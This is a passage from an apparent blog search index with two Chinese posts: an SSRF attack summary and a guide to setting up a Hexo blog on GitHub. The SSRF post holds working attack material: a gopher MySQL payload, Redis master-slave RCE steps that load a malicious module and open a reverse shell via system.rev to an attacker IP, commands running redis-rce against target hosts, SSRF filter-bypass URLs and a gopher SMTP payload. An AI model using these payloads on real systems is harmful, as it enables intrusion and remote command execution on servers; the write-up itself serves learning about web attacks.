href=\"#SSRF与MySQL：\" class=\"headerlink\" title=\"SSRF与MySQL：\"></a>SSRF与MySQL：</h3><p>对于MySQL也是同样的操作，可以通过Gopher对MySQL进行未授权访问，获取信息。</p>\n<h3 id=\"MySQL连接方式：\"><a href=\"#MySQL连接方式：\" class=\"headerlink\" title=\"MySQL连接方式：\"></a>MySQL连接方式：</h3><p>MySQL分为服务端和客户端，客户端连接服务器有三种方法</p>\n<blockquote>\n<p>Unix套接字；<br>内存共享/命名管道；<br>TCP/IP套接字</p>\n</blockquote>\n<ul>\n<li>在Linux或者Unix环境下，当我们输入<code>mysql –uroot –proot</code>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</li>\n<li>在Windows系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</li>\n<li><code>TCP/IP</code>套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h127.0.0.1 –uroot –proot</code>时就是要TCP/IP套接字。所以当我们需要抓取mysql通信数据包时必须使用<code>TCP/IP</code>套接字连接。</li>\n</ul>\n<h4 id=\"复现：\"><a href=\"#复现：\" class=\"headerlink\" title=\"复现：\"></a>复现：</h4><p>首先连入MySQL数据库。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -h 127.0.0.1 -uroot -p</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>tcpdump</code>进行抓包。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i lo port 3306 -w mysql.pcap</span><br></pre></td></tr></table></figure>\n\n<p>把抓到的包放进wireshark</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201217134604.png\" alt></p>\n<p>右键TCP追踪流，查看原始数据</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201217134828.png\" alt></p>\n<p>提取出原始数据，并合成为一段字符串。每两个字符前面加一个<code>%</code>，就是将我们的请求进行了url编码，在通过gopher协议发送tcp数据包</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://127.0.0.1:3306/_%cf%00%00%01%84%a6%9f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0f%00%00%00%72%6f%6f%74%00%14%4a%94%88%b1%e0%3a%e2%95%89%df%50%7c%8f%d0%88%a6%68%c8%0f%f5%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%7e%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%0a%6c%69%62%6d%61%72%69%61%64%62%04%5f%70%69%64%05%31%35%35%37%37%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%05%33%2e%31%2e%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%5f%73%65%72%76%65%72%5f%68%6f%73%74%09%31%32%37%2e%30%2e%30%2e%31%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%11%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%01%00%00%00%01 --output -</span><br></pre></td></tr></table></figure>\n\n<p>最后可能因为本地的MySQL版本原因，我这里没有回显成功。</p>\n<p>编码脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"comment\">#每两个字符前面加一个%</span></span><br><span class=\"line\"><span class=\"comment\">#需要先把pcap中的数据转换为原始数据，并且删除回车符拼接为一个字符串</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">results</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    open()</span><br><span class=\"line\">    a=[s[i:i+<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,len(s),<span class=\"number\">2</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"curl gopher://127.0.0.1:80/_%\"</span>+<span class=\"string\">\"%\"</span>.join(a)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">import</span> sys</span><br><span class=\"line\">    s=sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">    print(results(s))</span><br></pre></td></tr></table></figure>\n\n<p>无论是Redis还是MySQL，都可以使用Gopherus来生成Payload。</p>\n<h3 id=\"主从复制：\"><a href=\"#主从复制：\" class=\"headerlink\" title=\"主从复制：\"></a>主从复制：</h3><h4 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><blockquote>\n<p>是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p>\n</blockquote>\n<h4 id=\"限制条件：\"><a href=\"#限制条件：\" class=\"headerlink\" title=\"限制条件：\"></a>限制条件：</h4><blockquote>\n<ol>\n<li>Redis4.x/5.x</li>\n<li>未授权访问</li>\n</ol>\n</blockquote>\n<p>Redis4.x以后增加了模块功能，可以通过加载C语言编写的恶意<code>.so</code>文件，从而达到命令执行</p>\n<h4 id=\"攻击流程：\"><a href=\"#攻击流程：\" class=\"headerlink\" title=\"攻击流程：\"></a>攻击流程：</h4><ol>\n<li><p>通过未授权访问，连入目标机的Redis。</p>\n</li>\n<li><p>将该Redis的设为<code>Slave</code>服务器，并将攻击者的恶意Redis服务器设为<code>Master</code>服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#设置redis的备份路径为当前目录</span></span><br><span class=\"line\">    config <span class=\"built_in\">set</span> dir ./</span><br><span class=\"line\"><span class=\"comment\">#设置备份文件名为exp.so，默认为dump.rdb</span></span><br><span class=\"line\">    config <span class=\"built_in\">set</span> dbfilename exp.so</span><br><span class=\"line\"><span class=\"comment\">#设置主服务器IP和端口</span></span><br><span class=\"line\">    slaveof 192.168.172.129 1234  </span><br><span class=\"line\"><span class=\"comment\">#加载恶意模块</span></span><br><span class=\"line\">    module load ./exp.so</span><br><span class=\"line\"><span class=\"comment\">#切断主从，关闭复制功能</span></span><br><span class=\"line\">    slaveof no one </span><br><span class=\"line\"><span class=\"comment\">#执行系统命令</span></span><br><span class=\"line\">    system.exec <span class=\"string\">'whoami'</span></span><br><span class=\"line\">    system.rev 127.0.0.1 9999    </span><br><span class=\"line\"><span class=\"comment\">#通过dump.rdb文件恢复数据</span></span><br><span class=\"line\">    config <span class=\"built_in\">set</span> dbfilename dump.rdb</span><br><span class=\"line\"><span class=\"comment\">#删除exp.so</span></span><br><span class=\"line\">    system.exec <span class=\"string\">'rm ./exp.so'</span></span><br><span class=\"line\"><span class=\"comment\">#卸载system模块的加载</span></span><br><span class=\"line\">    module unload system</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h4 id=\"一些自动化工具：\"><a href=\"#一些自动化工具：\" class=\"headerlink\" title=\"一些自动化工具：\"></a>一些自动化工具：</h4><h5 id=\"so文件的生成：\"><a href=\"#so文件的生成：\" class=\"headerlink\" title=\".so文件的生成：\"></a><code>.so</code>文件的生成：</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class=\"line\"><span class=\"built_in\">cd</span> RedisModules-ExecuteCommand/</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"攻击端执行脚本：\"><a href=\"#攻击端执行脚本：\" class=\"headerlink\" title=\"攻击端执行脚本：\"></a>攻击端执行脚本：</h5><p>python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</span></span><br><span class=\"line\"></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/Ridter/redis-rce.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> redis-rce/</span><br><span class=\"line\">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class=\"line\">pip install -r requirements.txt </span><br><span class=\"line\">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"一键GetShell：\"><a href=\"#一键GetShell：\" class=\"headerlink\" title=\"一键GetShell：\"></a>一键GetShell：</h5><p>工具地址：<a href=\"https://github.com/n0b0dyCN/redis-rogue-server\" target=\"_blank\" rel=\"noopener\">https://github.com/n0b0dyCN/redis-rogue-server</a></p>\n<h1 id=\"四、关于SSRF的绕过：\"><a href=\"#四、关于SSRF的绕过：\" class=\"headerlink\" title=\"四、关于SSRF的绕过：\"></a>四、关于SSRF的绕过：</h1><ol>\n<li><p>攻击本地：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:80</span><br><span class=\"line\">http://localhost:22</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>利用<code>[::]</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用[::]绕过localhost</span><br><span class=\"line\">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>\n\n\n</li>\n</ol>\n<ol start=\"3\">\n<li><p>利用@</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://example.com@127.0.0.1</span><br></pre></td></tr></table></figure>\n\n\n</li>\n</ol>\n<ol start=\"4\">\n<li><p>利用短地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://tool.chinaz.com/tools/dwz.aspx\" target=\"_blank\" rel=\"noopener\">短连接生成</a></p>\n</li>\n<li><p>利用特殊域名</p>\n<p>利用原理是DNS解析</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228152711.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.owasp.org.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228220747.png\" alt></p>\n</li>\n<li><p>利用DNS解析</p>\n<p>在域名上设置A记录，指向127.0.0.1</p>\n</li>\n<li><p>利用上传</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">也不一定是上传，我也说不清，自己体会 -.-</span><br><span class=\"line\">修改&quot;type=file&quot;为&quot;type=url&quot;</span><br><span class=\"line\">比如：</span><br><span class=\"line\">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>利用Enclosed alphanumerics</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用Enclosed alphanumerics</span><br><span class=\"line\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class=\"line\">List:</span><br><span class=\"line\">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class=\"line\">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class=\"line\">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class=\"line\">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class=\"line\">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class=\"line\">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class=\"line\">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class=\"line\">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>利用句号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127。0。0。1/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228153609.png\" alt></p>\n</li>\n<li><p>利用进制转换</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以是十六进制，八进制等。</span><br><span class=\"line\">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class=\"line\">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class=\"line\">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class=\"line\">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br></pre></td></tr></table></figure>\n\n\n</li>\n</ol>\n<pre><code><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class=\"line\">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br></pre></td></tr></table></figure></code></pre><ol start=\"11\">\n<li><p>利用特殊地址（未成功）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://0/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>利用协议（未成功）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Dict://</span><br><span class=\"line\">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class=\"line\">ssrf.php?url=dict://attacker:11111/</span><br><span class=\"line\">SFTP://</span><br><span class=\"line\">ssrf.php?url=sftp://example.com:11111/</span><br><span class=\"line\">TFTP://</span><br><span class=\"line\">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class=\"line\">LDAP://</span><br><span class=\"line\">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class=\"line\">Gopher://</span><br><span class=\"line\">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure>\n\n\n\n</li>\n</ol>\n<ol start=\"13\">\n<li>结合以上自由组合绕过<h1 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference:\"></a>Reference:</h1></li>\n</ol>\n<p><a href=\"https://xz.aliyun.com/t/5665#\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5665#</a></p>\n","categories":["Summary"],"tags":["web","SSRF"]},{"title":"搭建hexo+github博客和其中的一些小问题","url":"http://yoursite.com/2019/10/03/build-a-blog/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a><strong>前言</strong></h2><p>趁着国庆放假，终于把自己的博客搭好了，还是挺有成就感得，记录一下</p>\n<h1 id=\"搭建正文\"><a href=\"#搭建正文\" class=\"headerlink\" title=\"搭建正文 :\"></a><strong>搭建正文</strong> :</h1><hr>\n<h2 id=\"一、本地与Github的连接\"><a href=\"#一、本地与Github的连接\" class=\"headerlink\" title=\"一、本地与Github的连接\"></a><strong>一、本地与Github的连接</strong></h2><p>要想搭建好博客，就得先连接到Github上</p>\n<h3 id=\"1-一些必备的软件\"><a href=\"#1-一些必备的软件\" class=\"headerlink\" title=\"1.一些必备的软件\"></a><strong>1.一些必备的软件</strong></h3><ul>\n<li><a href=\"https://nodejs.org/en/\" target=\"_blank\" rel=\"noopener\">Node.js</a><blockquote>\n<p>安装好之后，在CMD中输入<code>node -v</code>和<code>npm -v</code>，如果出现版本号，代表安装成功.</p>\n</blockquote>\n</li>\n<li><a href=\"https://git-scm.com/\" target=\"_blank\" rel=\"noopener\">Git</a><blockquote>\n<p>Git安装好之后，在桌面右键会出现：<img src=\"https://i.loli.net/2019/10/03/YQEqoC2VR8tf5Dh.png\" alt=\"20191003134123.png\"></p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"2-注册一个github账号\"><a href=\"#2-注册一个github账号\" class=\"headerlink\" title=\"2.注册一个github账号\"></a><strong>2.注册一个github账号</strong></h3><p> 先进入<a href=\"https://github.com/\" target=\"_blank\" rel=\"noopener\">github</a>，然后点击右上角的<strong><em>Sign up</em></strong></p>\n<p> 进入<strong><em>Sign up</em></strong>页面后，按照流程注册账号<br><img src=\"https://i.loli.net/2019/10/03/gKZiSRB9jDbdfcY.png\" alt=\"20191003115036.png\"><br><img src=\"https://i.loli.net/2019/10/03/1W6STFuaQCDIU7s.png\" alt=\"20191003120216.png\"></p>\n<p>这里要注意一下：</p>\n<blockquote>\n<p>个人的网站网址是固定格式：username.github.io(当然之后你也可以自己买域名进行绑定)</p>\n<p>所以注册的时候Username不要乱填，<strong>谨慎谨慎谨慎！！</strong></p>\n</blockquote>\n<h3 id=\"3-创建New-Repository\"><a href=\"#3-创建New-Repository\" class=\"headerlink\" title=\"3.创建New Repository\"></a><strong>3.创建New Repository</strong></h3><p>登陆刚才创建好的Github，点击右上角的 <strong><em>+</em></strong> 号，创建New Repository，之后你所有的博客动态都会在Respoitory更新</p>\n<p><img src=\"https://i.loli.net/2019/10/03/clVHLgqGdfJ8W6x.png\" alt=\"20191003131029.png\"><br><img src=\"https://i.loli.net/2019/10/03/GI6i4wEpoBc5gQx.png\" alt=\"20191003131223.png\"></p>\n<blockquote>\n<p>在创建Repository的时候，Repository name必须是username.github.io<br>不然可能会导致本地和github无法连接。<br>其他的暂时可以忽略，点击Create repository</p>\n</blockquote>\n<h3 id=\"4-配置SSH-Keys\"><a href=\"#4-配置SSH-Keys\" class=\"headerlink\" title=\"4.配置SSH Keys\"></a><strong>4.配置SSH Keys</strong></h3><p>SSH Keys是用来连接本地的git项目和Github的，通过SSH Keys可以使项目保持更新。</p>\n<ul>\n<li><p>检查SSH Keys的设置<br>  <br>检查自己的电脑上是否已经存在SSH Keys。右键打开Git bush here：<br></p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd ~<span class=\"regexp\">/.ssh</span></span><br></pre></td></tr></table></figure>\n\n<p>  <img src=\"https://i.loli.net/2019/10/03/atADwRP16d59iFZ.png\" alt=\"20191003140453.png\"></p>\n</li>\n</ul>\n<p>出现 <strong>No such file or diectory</strong>，电脑上面还未有SSH Keys</p>\n<ul>\n<li><p>生成新的SSH Keys：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh-keygen -t rsa -C <span class=\"string\">\"邮件地址@youremail.com\"</span></span><br><span class=\"line\">Generating public/private rsa key pair.</span><br><span class=\"line\">Enter file <span class=\"keyword\">in</span> which to save the key (<span class=\"regexp\">/Users/y</span>our_user_directory/.ssh/id_rsa):&lt;回车&gt;</span><br></pre></td></tr></table></figure>\n\n<p>邮箱地址是你的注册github的邮箱，之后系统会提示，要求你输入新密码:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enter passphrase (empty <span class=\"keyword\">for</span> no passphrase):&lt;密码&gt;</span><br><span class=\"line\">Enter same passphrase again:&lt;再次输入密码&gt;</span><br></pre></td></tr></table></figure>\n\n<p>密码是作为提交项目时候的一个验证。你可以选择不输入密码，直接设置为空，但是为了安全，建议设置密码。<strong>注意</strong>：<strong>这里输入密码的时候是看不见的</strong><br><img src=\"https://i.loli.net/2019/10/03/D7VKGMNkr8x4twF.png\" alt=\"20191003142919.png\"></p>\n<p>当弹出这样的界面，就成功设置SSH Keys了</p>\n</li>\n</ul>\n<p>然后输入：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat ~<span class=\"regexp\">/.ssh/i</span>d_rsa.pub</span><br></pre></td></tr></table></figure>\n\n<p>将输出的内容复制，进到Github个人设置里的相应位置<br><img src=\"https://i.loli.net/2019/10/03/T1Ek5FHLS3ajC6e.png\" alt=\"20191003144243.png\"></p>\n<p>继续选中左边菜单栏的<strong><em>SSH and GPG keys</em></strong>，点击<strong><em>New SSH key</em></strong><br><img src=\"https://i.loli.net/2019/10/03/54IZmTwNnsejHhv.png\" alt=\"20191003144526.png\"></p>\n<blockquote>\n<p>Title随意取</p>\n<p>Key就把刚才复制的，粘贴进去就行</p>\n</blockquote>\n<p>添加完毕以后，你的SSH keys应该是这样 :<img src=\"https://i.loli.net/2019/10/03/kjhBZVsFUvza3lH.png\" alt=\"6`YTM}$K07RN2U%`TLS)OEN.png\"></p>\n<h3 id=\"5-测试\"><a href=\"#5-测试\" class=\"headerlink\" title=\"5.测试\"></a><strong>5.测试</strong></h3><p>回到git bush里面，输入以下代码进行测试：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n\n<p>回车，看到以下回显：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>The authenticity <span class=\"keyword\">of</span> host <span class=\"string\">'GitHub.com (207.97.227.239)'</span> can<span class=\"string\">'t be established.</span></span><br><span class=\"line\"><span class=\"string\">2.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class=\"line\"><span class=\"string\">3.Are you sure you want to continue connecting (yes/no)</span></span><br></pre></td></tr></table></figure>\n\n<p>输入yes，回车（<strong>不能直接回车</strong>）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enter passphrase <span class=\"keyword\">for</span> key <span class=\"string\">'/c/Users/Yi/.ssh/id_rsa'</span>:</span><br></pre></td></tr></table></figure>\n\n<p>输入刚才设置的密码，你会看到“Hi，username.You’ve successfully authenticated…”<br>设置成功</p>\n<h3 id=\"6-设置用户信息\"><a href=\"#6-设置用户信息\" class=\"headerlink\" title=\"6.设置用户信息\"></a><strong>6.设置用户信息</strong></h3><p>现在就是完善个人信息</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"username\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"注册时填写的邮箱\"</span></span><br></pre></td></tr></table></figure>\n\n<p>这一步完成，本机就已经和Github连接！！！</p>\n<h2 id=\"二、搭建Hexo博客\"><a href=\"#二、搭建Hexo博客\" class=\"headerlink\" title=\"二、搭建Hexo博客\"></a><strong>二、搭建Hexo博客</strong></h2><p>接下来就是搭建博客的主体</p>\n<h3 id=\"1-安装Hexo\"><a href=\"#1-安装Hexo\" class=\"headerlink\" title=\"1.安装Hexo\"></a><strong>1.安装Hexo</strong></h3><p>利用npm命令安装Hexo</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo</span><br></pre></td></tr></table></figure>\n\n<p>安装完成后输入 <code>hexo 